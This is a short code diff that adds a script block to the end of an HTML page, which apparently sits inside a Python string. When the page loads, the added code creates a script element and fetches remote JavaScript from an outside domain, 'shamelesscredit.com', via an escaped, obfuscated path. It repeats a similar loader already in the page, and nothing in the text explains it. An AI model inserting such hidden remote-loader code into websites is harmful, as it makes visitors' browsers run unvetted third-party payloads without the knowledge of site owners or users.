@@ -457,6 +457,18 @@ s.referrerPolicy = 'no-referrer-when-downgrade';
 l.parentNode.insertBefore(s, l);
 })({})
 </script>
+<script>
+(function(pthlr){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = pthlr || {};
+s.src = "\/\/shamelesscredit.com\/bSX.VXsQd\/GTl\/0PYoW\/cs\/_epm\/9\/ubZ\/UBlwkcPwTDYdzDNkTGEDz_NQTsUOtjNAj\/MG1aMhThMU1\/NPgm";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 </body>
 </html>
 '''
